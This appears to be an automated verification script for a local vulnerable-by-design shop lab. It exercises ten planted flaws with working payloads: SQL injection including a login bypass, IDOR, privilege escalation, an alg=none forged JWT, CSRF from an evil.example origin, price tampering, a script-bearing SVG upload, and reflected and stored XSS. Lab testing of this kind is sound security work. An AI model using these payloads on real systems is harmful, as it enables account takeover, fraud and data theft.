import { chromium } from 'playwright-core';
import { CHROME } from './browser.mjs';

const BASE = 'http://127.0.0.1:8081';
const PRODUCT_ID = 1003;          // canonical demo product (seeded review + V04/V09 target)
const HIDDEN_PRODUCT_ID = 1021;   // V01 hidden product ("星澜隐藏礼盒（注入可见）")
const LAB_USER_COUNT = 8;         // /api/admin/users (lab directory), not the 27 SQLite users

const results = [];
const rec = (id, pass, detail) => {
  results.push({ id, pass, detail });
  console.log((pass ? 'PASS ' : 'FAIL ') + id + ' ' + JSON.stringify(detail));
};

const req = async (path, options = {}) => {
  const response = await fetch(BASE + path, options);
  const text = await response.text();
  let json = null;
  try { json = JSON.parse(text); } catch {}
  return { s: response.status, j: json, t: text, h: Object.fromEntries(response.headers) };
};

const login = async (email, password) => await req('/rest/user/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password }),
});

const bearer = (token) => ({ Authorization: 'Bearer ' + token });
const b64 = (value) => Buffer.from(JSON.stringify(value)).toString('base64url');

const aliceLogin = await login('alice@stellarpick.example', 'Alice@2026');
const alice = aliceLogin.j?.authentication?.token;
if (!alice) {
  console.error('FATAL: alice login failed', aliceLogin.s, aliceLogin.t.slice(0, 200));
  process.exit(1);
}
const adminLogin = await login('admin@stellarpick.example', 'admin123');
const admin = adminLogin.j?.authentication?.token;
if (!admin) {
  console.error('FATAL: admin login failed', adminLogin.s, adminLogin.t.slice(0, 200));
  process.exit(1);
}

// V01 - UNION SQL injection in the product search.
const V01_PAYLOAD = "')) UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--";
const v01 = await req('/rest/products/search?q=' + encodeURIComponent(V01_PAYLOAD));
const v01Rows = v01.j?.data ?? [];
const v01Hidden = v01Rows.find((product) => product.id === HIDDEN_PRODUCT_ID);
rec('V01', v01.s === 200 && v01Rows.length === 21 && !!v01Hidden && v01Hidden.deletedAt != null, {
  status: v01.s,
  count: v01Rows.length,
  hiddenId: v01Hidden?.id,
  hiddenName: v01Hidden?.name,
});

// V02 - login SQL injection. The first row is the admin account.
const v02 = await login("' OR 1=1--", 'x');
let v02Payload = null;
try { v02Payload = JSON.parse(Buffer.from(v02.j.authentication.token.split('.')[1], 'base64url').toString()); } catch {}
rec('V02', v02.s === 200 && v02Payload?.data?.id === 1 && v02Payload?.data?.role === 'admin', {
  status: v02.s,
  userId: v02Payload?.data?.id,
  role: v02Payload?.data?.role,
  email: v02Payload?.data?.email,
});

// V05 - IDOR on the order detail. Alice reads Bob's seeded order 1002.
const v05 = await req('/api/orders/1002', { headers: bearer(alice) });
const v05List = await req('/api/orders', { headers: bearer(alice) });
rec('V05', v05.s === 200 && v05.j?.ownerId === 3 && v05.j?.ownerEmail === 'bob@stellarpick.example', {
  status: v05.s,
  ownerId: v05.j?.ownerId,
  ownerName: v05.j?.ownerName,
  ownerEmail: v05.j?.ownerEmail,
  total: v05.j?.total,
  aliceListTotal: v05List.j?.total,
});

// V06 - vertical privilege escalation. Any logged-in user can read the lab user directory.
const v06 = await req('/api/admin/users', { headers: bearer(alice) });
rec('V06', v06.s === 200 && v06.j?.total === LAB_USER_COUNT && (v06.j?.items ?? []).length === LAB_USER_COUNT, {
  status: v06.s,
  total: v06.j?.total,
  rows: (v06.j?.items ?? []).length,
});

// V07 - alg=none JWT accepted by the lab guard (lab routes only).
const forged = b64({ alg: 'none', typ: 'JWT' }) + '.' + b64({ data: { id: 1, role: 'admin', email: 'admin@stellarpick.example' } }) + '.';
const v07Settings = await req('/api/admin/settings', { headers: bearer(forged) });
const v07Users = await req('/api/admin/users', { headers: bearer(forged) });
const v07Native = await req('/api/Users', { headers: bearer(forged) });
rec('V07', v07Settings.s === 200 && v07Users.s === 200, {
  settings: v07Settings.s,
  users: v07Users.s,
  nativeUsers: v07Native.s, // 200 as well: express-jwt 0.1.3 + jsonwebtoken 0.4.0 accept alg=none
});

// V08 - CSRF via the sp_token session cookie (HttpOnly; Secure; SameSite=None).
// Login sets the cookie; a third-party page can POST without any CSRF token or Origin check.
const v08 = await req('/api/account/email', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    Cookie: 'sp_token=' + alice,
    Origin: 'http://evil.example',
  },
  body: 'email=csrf@example.com',
});
const v08NoAuth = await req('/api/account/email', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded', Origin: 'http://evil.example' },
  body: 'email=csrf-noauth@example.com',
});
rec('V08', v08.s === 204, {
  status: v08.s,
  auth: 'Cookie sp_token',
  origin: 'http://evil.example',
  csrfToken: 'none',
  noAuthStatus: v08NoAuth.s, // expected 401: still requires a session, just not a CSRF token
});
// Restore the victim e-mail so repeated runs and the demo account keep working.
await req('/api/account/email', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', ...bearer(alice) },
  body: JSON.stringify({ email: 'alice@stellarpick.example' }),
});

// V09 - client supplied unitPrice is trusted by cart + checkout.
const cartBefore = await req('/api/cart', { headers: bearer(alice) });
for (const line of cartBefore.j?.items ?? []) {
  await req('/api/cart/items/' + line.id, { method: 'DELETE', headers: bearer(alice) });
}
const v09Cart = await req('/api/cart/items', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', ...bearer(alice) },
  body: JSON.stringify({ productId: PRODUCT_ID, quantity: 1, unitPrice: 0.01 }),
});
const v09Checkout = await req('/api/checkout', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', ...bearer(alice) },
  body: JSON.stringify({
    items: [{ productId: PRODUCT_ID, unitPrice: 0.01, quantity: 1, title: '星澜 316 不锈钢保温杯 500ml', image: 'sp-1003.svg' }],
  }),
});
rec('V09', v09Cart.s === 200 && v09Cart.j?.total === 0.01 && v09Checkout.s === 200 && v09Checkout.j?.total === 0.01, {
  cartTotal: v09Cart.j?.total,
  orderId: v09Checkout.j?.id,
  orderTotal: v09Checkout.j?.total,
});

// V10 - unrestricted SVG upload, served inline from /uploads.
const svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("V10")</script></svg>';
const form = new FormData();
form.append('file', new Blob([svg], { type: 'image/svg+xml' }), 'avatar.svg');
const upload = await fetch(BASE + '/api/account/avatar', { method: 'POST', headers: bearer(alice), body: form });
const uploaded = await upload.json();
const uploadedFile = await req(uploaded.url);
rec('V10', upload.status === 200 && uploadedFile.t.includes('<script>') && String(uploadedFile.h['content-type']).includes('svg'), {
  url: uploaded.url,
  type: uploadedFile.h['content-type'],
  originalName: uploaded.originalName,
});

// V03 / V04 need a real DOM.
const browser = await chromium.launch({ executablePath: CHROME, headless: true });
const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
await context.addInitScript((token) => localStorage.setItem('token', token), alice);
const page = await context.newPage();

// V03 - reflected XSS in the search headline.
const v03Payload = '<img src=x onerror="window.__v03=1">';
await page.goto(BASE + '/#/search?q=' + encodeURIComponent(v03Payload), { waitUntil: 'networkidle' });
await page.waitForTimeout(1000);
const v03Flag = await page.evaluate(() => window.__v03);
const v03Headline = await page.locator('h1.headline').innerHTML().catch(() => '');
rec('V03', v03Flag === 1 && v03Headline.includes('onerror'), { flag: v03Flag, headlineHasPayload: v03Headline.includes('onerror') });

// V04 - stored XSS in a product review, rendered with bypassSecurityTrustHtml.
const put = await fetch(BASE + '/rest/products/' + PRODUCT_ID + '/reviews', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ message: '<img src=x alt="" onerror="window.__v04=1">很好用', author: 'alice@stellarpick.example' }),
});
await page.goto(BASE + '/#/product/' + PRODUCT_ID, { waitUntil: 'networkidle' });
await page.click('#tab-reviews');
await page.waitForTimeout(1000);
const v04Flag = await page.evaluate(() => window.__v04);
rec('V04', put.status === 201 && v04Flag === 1, { put: put.status, flag: v04Flag, productId: PRODUCT_ID });
await browser.close();

const failed = results.filter((result) => !result.pass);
console.log('SUMMARY', results.length, 'checks', failed.length, 'failed');
process.exitCode = failed.length ? 1 : 0;
